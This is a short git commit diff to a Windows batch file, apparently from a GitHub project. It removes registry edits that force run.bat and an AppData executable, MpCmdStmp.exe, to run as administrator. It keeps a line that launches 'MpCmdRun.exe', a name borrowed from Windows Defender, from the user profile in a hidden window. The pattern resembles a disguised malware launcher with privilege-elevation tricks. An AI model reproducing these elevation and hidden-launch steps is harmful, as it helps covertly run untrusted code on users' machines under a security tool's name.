a478a3819f2a6ca4b3c7fcce25a135c96b7d8946
SszOnTop <155780283+SszOnTop@users.noreply.github.com>
2024-02-23 17:53:49 +0100

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,4 +1,1 @@
-powershell New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" -Name %USERPROFILE%\run.bat -Value RUNASADMIN -PropertyType string -Force | Out-Null
-powershell New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" -Name %USERPROFILE%\AppData\Roaming\MpCmdStmp.exe -Value RUNASADMIN -PropertyType string -Force | Out-Null
-
 powershell Start-Process "%USERPROFILE%\MpCmdRun.exe" -WindowStyle Hidden
